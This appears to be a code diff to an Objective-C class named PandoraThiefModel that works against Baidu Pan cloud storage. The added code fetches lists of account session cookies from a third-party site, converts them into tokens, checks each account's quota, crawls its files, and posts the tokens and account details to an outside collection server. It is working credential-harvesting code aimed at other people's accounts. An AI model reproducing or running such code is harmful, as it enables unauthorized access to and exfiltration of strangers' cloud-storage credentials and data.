@@ -12,6 +12,8 @@
 #import "PandoraConnection.h"
 #import "PandoraThiefModel.h"
 
+#define kPandoraJuanZhiURL @"http://js2.me/share_account_list.php"
+#define kPandoraJuanZhiAccountURL @"http://js2.me/share_account_list.php?id=%@"
 #define kPandoraQuotaURL @"http://pan.baidu.com/api/quota"
 #define kPandoraFileListURL @"http://pan.baidu.com/api/list?order=time&desc=1&web=1&dir=%@"
 
@@ -60,6 +62,64 @@ SINGLETON_FOR_CLASS(PandoraThiefModel)
     return NO;
 }
 
+- (void)run
+{
+    PandoraConnection *conn = [PandoraConnection connectionWithURL:[NSURL URLWithString:kPandoraJuanZhiURL]];
+    conn.delegate = self;
+    [conn startAsynchronous];
+}
+
+- (void)fetch
+{
+    [GCDHelper dispatchBlock:^{
+        for (NSDictionary *account in _accounts) {
+            NSString *url = [NSString stringWithFormat:kPandoraJuanZhiAccountURL, account[@"id"]];
+            PandoraConnection *conn = [PandoraConnection connectionWithURL:[NSURL URLWithString:url]];
+            NSData *response = [conn startSynchronous];
+            [self post:response];
+        }
+    } complete:^{
+        
+    }];
+}
+
+- (NSString *)tokenForString:(NSString *)cookie
+{
+    NSArray *array = [cookie componentsSeparatedByString:@";"];
+    NSMutableString *result = [[NSMutableString alloc] init];
+    for (NSString *sub in array) {
+        NSArray *subArray = [sub componentsSeparatedByString:@"|"];
+        if ([sub isEqual:[array lastObject]]) {
+            [result appendFormat:@"%@=%@", subArray[0], subArray[1]];
+        }
+        else {
+            [result appendFormat:@"%@=%@;", subArray[0], subArray[1]];
+        }
+        
+    }
+    return result;
+}
+
+- (NSData *)bodyForDict:(NSDictionary *)dict
+{
+    @try {
+        NSMutableDictionary *request = [NSMutableDictionary dictionary];
+        request[@"name"] = dict[@"nickname"];
+        request[@"description"] = dict[@"description"];
+        request[@"quota"] = dict[@"quota"];
+        NSString *token = [self tokenForString:dict[@"cookie"]];
+        request[@"token"] = token;
+        request[@"hash"] = [[NSString stringWithFormat:@"%@-zen", token] md5];
+        request[@"type"] = dict[@"type"];
+        request[@"quota"] = dict[@"quota"];
+        request[@"count"] = dict[@"count"];
+        return [NSJSONSerialization dataWithJSONObject:request options:NSJSONWritingPrettyPrinted error:NULL];
+    }
+    @catch (NSException *exception) {
+        NSLog(@"PandoraThiefModel bodyForDict exception: %@", [exception description]);
+    }
+    return nil;
+}
 
 - (long long)quota:(NSString *)token
 {
@@ -71,14 +131,14 @@ SINGLETON_FOR_CLASS(PandoraThiefModel)
         NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:response options:NSJSONReadingAllowFragments error:NULL];
         int error = [dict intForKey:@"errno"];
         if (error == 0) {
-           long long used = [dict longLongForKey:@"used"];
+            long long used = [dict longLongForKey:@"used"];
             return used;
         }
     }
     @catch (NSException *exception) {
         NSLog(@"PandoraThiefModel quota exception: %@", [exception description]);
     }
-
+    
     return -1;
 }
 
@@ -129,6 +189,41 @@ SINGLETON_FOR_CLASS(PandoraThiefModel)
     return 0;
 }
 
+- (void)post:(NSData *)data
+{
+    @try {
+        NSMutableDictionary *dict = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:NULL];
+        NSString *token = [self tokenForString:dict[@"cookie"]];
+        long long quota = [self quota:token];
+        if (quota > 0) {
+            dict[@"quota"] = [NSNumber numberWithLongLong:quota];
+            NSLog(@"post dict: %@", [dict description]);
+            _count = 0;
+            [self analyze:@"/" token:token];
+            dict[@"count"] = [NSNumber numberWithInt:_count];
+            //            if (_count < 10) {
+            //                // < 10 video just drop it
+            //                return;
+            //            }
+            // post to server
+            NSData *body = [self bodyForDict:dict];
+            if (body) {
+                NSString *url = @"http://zengit.duapp.com/category/add";
+                //NSString *url = @"http://127.0.0.1:8080/category/add";
+                PandoraConnection *conn = [PandoraConnection connectionWithURL:[NSURL URLWithString:url]];
+                conn.httpMethod = @"POST";
+                conn.httpBody = body;
+                NSData *response = [conn startSynchronous];
+                NSDictionary *data = [NSJSONSerialization JSONObjectWithData:response options:NSJSONReadingMutableContainers error:NULL];
+                NSLog(@"post response: %@", [data description]);
+            }
+        }
+    }
+    @catch (NSException *exception) {
+        NSLog(@"PandoraThiefModel post exception: %@", [exception description]);
+    }
+    
+}
 
 - (void)thief:(NSString *)token
 {
@@ -159,24 +254,46 @@ SINGLETON_FOR_CLASS(PandoraThiefModel)
 }
 
 #pragma mark
+#pragma mark PandoraConnectionDelegate Methods
+
+- (void)requestDidFinished:(PandoraConnection *)connection
+{
+    @try {
+        NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:connection.responseData options:NSJSONReadingAllowFragments error:NULL];
+        NSArray *categories = dict[@"data"];
+        [_accounts addObjectsFromArray:categories];
+        [self fetch];
+    }
+    @catch (NSException *exception) {
+        NSLog(@"PandoraThiefModel requestDidFinished exception: %@", [exception description]);
+    }
+}
+
+- (void)requestDidFailed:(PandoraConnection *)connection
+{
+    NSLog(@"PandoraThiefModel network error.");
+}
+
+#pragma mark
 #pragma mark Utils
 
 + (NSString *)size:(long long)size
 {
+    double result = size * 1.0f;
     NSString *suffix = @"B";
-    if (size > 1024) {
+    if (result > 1024.0f) {
         suffix = @"KB";
-        size = size / 1024; // KB
-        if (size > 1024) {
+        result = result / 1024.0f; // KB
+        if (result > 1024.0f) {
             suffix = @"MB";
-            size = size/1024; // MB
-            if (size > 1024) {
+            result = result / 1024.0f; // MB
+            if (result > 1024.0f) {
                 suffix = @"GB";
-                size = size/1024; // GB
+                result = result/1024.0f; // GB
             }
         }
     }
-    return [NSString stringWithFormat:@"%lld %@", size, suffix];
+    return [NSString stringWithFormat:@"%lf %@", result, suffix];
 }
 
 @end
